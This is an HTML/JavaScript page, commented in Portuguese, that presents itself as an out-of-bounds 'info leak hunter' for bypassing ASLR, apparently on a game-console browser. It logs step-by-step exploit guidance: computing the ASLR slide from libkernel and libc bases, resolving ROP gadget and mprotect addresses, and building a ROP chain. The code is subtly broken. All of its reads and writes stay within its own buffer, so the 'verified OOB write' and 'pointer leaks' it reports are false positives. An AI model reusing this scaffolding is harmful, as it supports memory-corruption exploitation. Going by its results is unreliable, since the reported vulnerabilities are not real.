<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Info Leak Hunter Avançado (Multi-Teste OOB)</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output, #output-canvas {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 80vh;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
        #xss-target-div { display: none; }
        #interactive-canvas { display: none; }
        #canvas-coord-status { display: none; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Info Leak Hunter Avançado (Multi-Teste OOB) - Foco em ASLR Bypass</h1>
    <p>Este script foca em executar o teste <code>testOOBReadInfoLeakEnhancedStore</code> com configurações avançadas, incluindo múltiplas tentativas de escrita OOB verificadas, para tentar vazar ponteiros da memória, auxiliando na análise para contornar o ASLR.</p>
    <button id="runBtn" onclick="runAllTests()">Iniciar Teste de Info Leak Avançado</button>
    <div id="output"></div>

    <script>
        'use strict';
        // --- Script Utilities (Shared) ---
        const SCRIPT_UTILS = {
            TO_HEX: (val, bits = 32) => {
                if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
                let num = Number(val);
                if (bits <= 32) { num = num >>> 0; } // Para garantir que números de 32 bits sejam tratados como unsigned
                const pad = Math.ceil(bits / 4);
                return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
            },
            IS_POTENTIAL_POINTER_64: (high, low) => {
                if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
                // Converter para unsigned 32-bit para a comparação
                const uHigh = high >>> 0;
                const uLow = low >>> 0;

                if (uHigh === 0 && uLow === 0) return false;
                if (uHigh === 0xFFFFFFFF && uLow === 0xFFFFFFFF) return false; // Common invalid/fill patterns
                if (uHigh === 0xBBBBBBBB && uLow === 0xBBBBBBBB) return false; // Novo padrão de preenchimento
                if (uHigh === 0xAAAAAAAA && uLow === 0xAAAAAAAA) return false; // Padrão de preenchimento anterior (por segurança)
                
                // Heurística mais flexível (Sugestão 3 original)
                if (uHigh === 0 && uLow < 0x1000) return false; // Filtrar apenas valores muito pequenos se high também for 0
                // A condição abaixo pode ser comentada para testes ainda mais permissivos:
                // if (uHigh < 0x20 && uLow < 0x10000 && uHigh !==1 && uHigh !==2) return false; // Exemplo de filtro adicional, pode ser ajustado

                return true;
            },
            IS_POTENTIAL_DATA_32: (val) => {
                if (val === null || typeof val !== 'number') return false;
                val = val >>> 0; // Tratar como unsigned
                if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xBBBBBBBB || val === 0xAAAAAAEE || val === 0x1A2B3C4D) return false; // Padrões de preenchimento/inválidos e valor de escrita OOB
                if (val < 0x1000) return false; // Excluir números muito pequenos
                return true;
            }
        };

        // --- Log Constants ---
        const LOG_TRUNCATE_MSG_S1 = "[Log S1 Truncado...]";
        const LOG_MAX_LENGTH = 800000; 
        const LOG_TRUNCATE_KEEP_LENGTH = 400000;

        // --- Script 1 (v18.6-infoleak-multitest) ---
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 20; 
        let leakedValueFromOOB = null; 

        const IMPORTANT_LOG_TYPES_S1 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];

        const log = (message, type = 'info', funcName = '') => {
            let keepLog = IMPORTANT_LOG_TYPES_S1.includes(type);
            if (!keepLog && type === 'good') {
                const lowerMsg = String(message).toLowerCase();
                 if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('concluído')) { keepLog = true; }
            }
            if (!keepLog) return;
            if (!outputDiv) return;
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                const prefix = funcName ? `[${funcName}] ` : '';
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
                if(outputDiv.innerHTML.length > LOG_MAX_LENGTH){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - LOG_TRUNCATE_KEEP_LENGTH); outputDiv.innerHTML = `<span>${LOG_TRUNCATE_MSG_S1}</span>\n` + outputDiv.innerHTML; }
                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            } catch(e) { console.error("Erro log S1:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
        };

        const PAUSE_S1 = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));

        const testOOBReadInfoLeakEnhancedStore = async () => {
            const FNAME = 'testOOBReadInfoLeakEnhancedStore';
            log("--- Iniciando Teste Avançado Multi-Teste: OOB Write/Read (Info Leak para ASLR) ---", 'test', FNAME);
            
            const bufferSize = 32; 
            const oobWriteValueU32 = 0x1A2B3C4D; // Novo valor de escrita U32 para diferenciar e verificar
            
            // Offsets relativos ao início do buffer lógico para tentar a escrita OOB
            const oobWriteCandidateOffsets = [
                bufferSize,        // Exatamente após o buffer
                bufferSize + 4,    // Um pouco mais adiante
                bufferSize - 4,    // Sobrepondo o final do buffer (se a vulnerabilidade permitir)
                bufferSize + 8,
                bufferSize - 8,
            ];

            // (Sugestão 1 original) Aumentar Faixa de Leitura
            const readRangeStart = -384; 
            const readRangeEnd = bufferSize + 384; 
            
            // (Sugestão 2 original) Ajustar allocationSize e baseOffsetInBuffer Proporcionalmente
            const allocationMargin = 256; 
            const requiredSpaceForRead = Math.abs(readRangeStart) + bufferSize + (readRangeEnd - bufferSize);
            const allocationSize = requiredSpaceForRead + allocationMargin + Math.max(...oobWriteCandidateOffsets.map(o => Math.abs(o))) + 8; // Garante espaço para a maior tentativa de escrita OOB
            const baseOffsetInBuffer = Math.abs(readRangeStart) + (allocationMargin / 2);

            log(`Config: bufferSize=${bufferSize}, writeValueU32=0x${oobWriteValueU32.toString(16)}, readStart=${readRangeStart}, readEnd=${readRangeEnd}, allocSize=${allocationSize}, baseOffset=${baseOffsetInBuffer}`, 'info', FNAME);
            log(`Tentando offsets de escrita OOB (relativos ao bufferSize ${bufferSize}): ${oobWriteCandidateOffsets.map(o => o - bufferSize).join(', ')}`, 'info', FNAME);

            const oobReadOffsets = [];
            for (let i = readRangeStart; i < readRangeEnd; i += 4) {
                oobReadOffsets.push(i);
            }

            let writeSuccess = false;
            let successfulWriteDetails = null;
            let potentialLeakFoundCount = 0;
            let u64LeakCount = 0; 
            leakedValueFromOOB = null;

            try {
                const buffer = new ArrayBuffer(allocationSize);
                const dataView = new DataView(buffer);

                log(`Preenchendo buffer de ${allocationSize} bytes com 0xBB...`, 'info', FNAME);
                for (let i = 0; i < buffer.byteLength; i++) {
                    dataView.setUint8(i, 0xBB);
                }
                await PAUSE_S1();

                // Loop para tentar diferentes offsets de escrita OOB U32
                for (const candidateOffset of oobWriteCandidateOffsets) {
                    const writeTargetAddress = baseOffsetInBuffer + candidateOffset; // candidateOffset é relativo ao início do buffer lógico
                    const relativeOffsetForLog = candidateOffset; // Para log, o offset a partir do início do buffer lógico

                    if (writeTargetAddress < 0 || writeTargetAddress + 4 > buffer.byteLength) {
                        log(`Offset de escrita OOB U32 ${relativeOffsetForLog} (addr_real ${writeTargetAddress}) fora dos limites do ArrayBuffer. Pulando.`, 'warn', FNAME);
                        continue;
                    }
                    
                    log(`Tentando escrita OOB U32 @offset_relativo ${relativeOffsetForLog} (addr_real ${writeTargetAddress}) com valor ${SCRIPT_UTILS.TO_HEX(oobWriteValueU32)}...`, 'subtest', FNAME);
                    try {
                        dataView.setUint32(writeTargetAddress, oobWriteValueU32, true); // true for little-endian
                        const readBackValue = dataView.getUint32(writeTargetAddress, true);

                        if (readBackValue === oobWriteValueU32) {
                            log(`VULN: Escrita OOB U32 @offset_relativo ${relativeOffsetForLog} (addr_real ${writeTargetAddress}) VERIFICADA! Val=${SCRIPT_UTILS.TO_HEX(oobWriteValueU32)}`, 'vuln', FNAME);
                            log(`---> PRIMITIVA OOB WRITE (U32 VERIFICADA) OBTIDA <---`, 'escalation', FNAME);
                            writeSuccess = true;
                            successfulWriteDetails = { offset: relativeOffsetForLog, address: writeTargetAddress, value: oobWriteValueU32 };
                            break; // Sucesso, sair do loop de tentativas de escrita
                        } else {
                            log(`Escrita OOB U32 @offset_relativo ${relativeOffsetForLog} (addr_real ${writeTargetAddress}) pareceu ter sucesso, mas verificação falhou. Lido: ${SCRIPT_UTILS.TO_HEX(readBackValue)}`, 'warn', FNAME);
                        }
                    } catch (e) {
                        log(`Escrita OOB U32 @offset_relativo ${relativeOffsetForLog} (addr_real ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME);
                    }
                    await PAUSE_S1(5); // Pequena pausa entre tentativas de escrita
                }


                if (!writeSuccess) {
                    log(`--- Teste Concluído (Nenhuma Escrita OOB U32 Verificada Bem-sucedida) ---`, 'test', FNAME);
                    return false;
                }
                
                await PAUSE_S1();
                log("Iniciando varredura de memória OOB para potenciais ponteiros (faixa ampliada, heurística relaxada)...", 'info', FNAME);

                for (const readOffset of oobReadOffsets) {
                    const readTargetAddress = baseOffsetInBuffer + readOffset;
                    const relOffsetStr = `@offset_relativo ${readOffset} (addr_real ${readTargetAddress})`;

                    // Tentar ler como U64 (8 bytes)
                    if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
                        try {
                            const low = dataView.getUint32(readTargetAddress, true);
                            const high = dataView.getUint32(readTargetAddress + 4, true);

                            if (SCRIPT_UTILS.IS_POTENTIAL_POINTER_64(high, low)) {
                                const highBigInt = BigInt(high >>> 0);
                                const lowBigInt = BigInt(low >>> 0);
                                const fullPtrVal = (highBigInt << 32n) | lowBigInt;
                                const fullPtrStr = '0x' + fullPtrVal.toString(16).toUpperCase().padStart(16, '0');
                                
                                const vStr = `High=${SCRIPT_UTILS.TO_HEX(high)} Low=${SCRIPT_UTILS.TO_HEX(low)} (Full: ${fullPtrStr})`;
                                log(`LEAK PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
                                potentialLeakFoundCount++; 
                                u64LeakCount++; 

                                const leakIdentifier = `Leak U64 #${u64LeakCount}`;
                                log(` (${leakIdentifier}) ---> GUIA ASLR/EXPLOIT (para ${vStr}):
    1. IDENTIFIQUE ESTE PONTEIRO: Compare '${vStr}' com os endereços nos seus arquivos:
        - 'endereços base.txt': Este ponteiro (${SCRIPT_UTILS.TO_HEX(low)}) está próximo a algum base (ex: libkernel @ ${SCRIPT_UTILS.TO_HEX(0x80FCA000)}, libc @ ${SCRIPT_UTILS.TO_HEX(0x180AC8000)})? (Full pointer: ${fullPtrStr})
        - Se sim, CALCULE O SLIDE ASLR: slide = (valor_do_ponteiro_vazado) - (offset_conhecido_do_item_apontado_na_lib OU base_da_lib_se_vazou_ponteiro_para_inicio_de_funcao).
            (Ex: Se ${fullPtrStr} aponta para algo que na libkernel (base 0x80FCA000) está no offset +0xABCD, então o novo base da libkernel é ${fullPtrStr} - 0xABCD)
    2. CALCULE ENDEREÇOS REAIS: Use o NOVO BASE da lib (ou o SLIDE) com os offsets dos seus arquivos:
        - 'libkernel.sprx.txt', 'libkernel_web.sprx.txt': Para ROP gadgets e funções. Endereço Real = offset_original_do_gadget/funcao + novo_base_da_lib.
        - 'offsets base libkernel web.txt': Para syscalls. Endereço Real = offset_do_arquivo + novo_base_da_libkernel_web (se o slide for aplicável).
        - 'sceKernelMprotect.txt': Para mprotect. Endereço Real = offset_mprotect (ex: 0x24280) + novo_base_da_libkernel.
    3. PLANEJE SEU EXPLOIT: Construa sua ROP chain.
    4. ALOCADOR: Use 'alocador de memoria customizado.txt' se precisar de R/W arbitrário.`, 'escalation', FNAME);
                                
                                if (!leakedValueFromOOB) { 
                                    leakedValueFromOOB = { high, low, full: fullPtrVal, type: 'U64', offset_relativo: readOffset, offset_real: readTargetAddress };
                                }
                            }
                        } catch (e) { /* Silenciar erros de leitura OOB, focando nos sucessos */ }
                    }
                    
                    // Leitura U32 (para dados gerais, se não for parte de um U64 já logado)
                    if (readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
                         try {
                            let isPartOfU64Leak = false;
                            if (leakedValueFromOOB && leakedValueFromOOB.offset_relativo === readOffset && leakedValueFromOOB.type === 'U64') isPartOfU64Leak = true;
                            if (leakedValueFromOOB && leakedValueFromOOB.offset_relativo === (readOffset - 4) && leakedValueFromOOB.type === 'U64') isPartOfU64Leak = true; // Check if this is the high part of a previously logged U64


                            if (!isPartOfU64Leak) {
                                const val32 = dataView.getUint32(readTargetAddress, true);
                                // Adicionada verificação para não logar o próprio valor de escrita OOB como leak de dados
                                if (val32 !== 0xBBBBBBBB && val32 !== oobWriteValueU32 && SCRIPT_UTILS.IS_POTENTIAL_DATA_32(val32) && !SCRIPT_UTILS.IS_POTENTIAL_POINTER_64(0, val32)) {
                                    const vStr32 = SCRIPT_UTILS.TO_HEX(val32);
                                    log(`LEAK DATA? U32 ${relOffsetStr}: ${vStr32}`, 'leak', FNAME);
                                    potentialLeakFoundCount++;
                                }
                            }
                        } catch (e) { /* Silenciar */ }
                    }

                    if (readOffset % 128 === 0) await PAUSE_S1(5); 
                }
            } catch (e) {
                log(`Erro FATAL no Teste de Info Leak: ${e.message}`, 'error', FNAME);
                console.error(e);
            } finally {
                const leakStatus = leakedValueFromOOB ? `1º leak U64 ARMAZENADO: High=${SCRIPT_UTILS.TO_HEX(leakedValueFromOOB.high)} Low=${SCRIPT_UTILS.TO_HEX(leakedValueFromOOB.low)} (Full: 0x${leakedValueFromOOB.full.toString(16).toUpperCase().padStart(16, '0')}) @rel ${leakedValueFromOOB.offset_relativo}` : 'nenhum U64 significativo armazenado globalmente';
                const writeSummary = writeSuccess ? `Escrita OOB U32 VERIFICADA @offset_relativo ${successfulWriteDetails.offset} com valor ${SCRIPT_UTILS.TO_HEX(successfulWriteDetails.value)}.` : 'Nenhuma escrita OOB verificada bem-sucedida.';
                
                log(`--- Teste de Info Leak Avançado Multi-Teste Concluído ---
    ${writeSummary}
    Total de leaks U64 potenciais visualizados (com GUIA): ${u64LeakCount}
    (Contagem geral de U64/U32 pode ser maior: ${potentialLeakFoundCount})
    Status do 1º Leak U64 Armazenado: ${leakStatus}
    Analise CADA 'GUIA ASLR/EXPLOIT' nos logs acima com seus arquivos de firmware.`, 'test', FNAME);
            }
            return writeSuccess;
        };

        const runAllTests = async () => {
            const FNAME = 'runAllTests';
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = '';
            log("==== INICIANDO Script Info Leak Hunter Avançado (v18.6-infoleak-multitest) ====", 'test', FNAME);
            await testOOBReadInfoLeakEnhancedStore();
            log("\n==== Script Info Leak Hunter Avançado CONCLUÍDO (v18.6-infoleak-multitest) ====", 'test', FNAME);
            if (runBtn) runBtn.disabled = false;
        };
    </script>

    <script>
        'use strict';
        // --- Script 2: Canvas (v18.6-infoleak-multitest) ---
        // Funcionalidade do Canvas permanece minimizada.
        let outputDivCanvas = null;
        const LOG_TRUNCATE_MSG_S2 = "[Log S2 Truncado...]";

        const logCanvas = (message, type = 'info', funcName = '') => {
            if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas'); 
            if (!document.getElementById('output-canvas') && !outputDivCanvas) return; 
            if (!outputDivCanvas && document.getElementById('output-canvas')) outputDivCanvas = document.getElementById('output-canvas');

            const timestamp = `[${new Date().toLocaleTimeString()}]`;
            const prefix = funcName ? `[CANVAS-${funcName}] ` : '[CANVAS] ';
            const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
            const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'critical'].includes(type) ? type : 'info';

            if (outputDivCanvas) { 
                if(outputDivCanvas.innerHTML.length > LOG_MAX_LENGTH){
                    outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - LOG_TRUNCATE_KEEP_LENGTH);
                    outputDivCanvas.innerHTML = `<span>${LOG_TRUNCATE_MSG_S2}</span>\n` + outputDivCanvas.innerHTML;
                }
                outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight;
            } else {
                console.log(`${timestamp} ${prefix}${sanitizedMessage}`); 
            }
        };
        
        const runCanvasTestSequence = async () => {
            const FNAME = 'runCanvasTestSequence';
            const runBtnCanvas = document.getElementById('runCanvasBtn');
            if (runBtnCanvas) runBtnCanvas.disabled = true;
            
            if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas');
            if (outputDivCanvas) outputDivCanvas.innerHTML = '';

            logCanvas("Script Canvas (v18.6-infoleak-multitest): Nenhuma tarefa de teste de vulnerabilidade ativa.", "info", FNAME);
            logCanvas("--- Fim da execução Script Canvas ---", 'test', FNAME);
            if (runBtnCanvas) runBtnCanvas.disabled = false;
        };

        const runCanvasTest = async () => { await runCanvasTestSequence(); };
        window.addEventListener('unload', () => { console.log("[App Unload] Limpeza."); });
    </script>

</body>
</html>
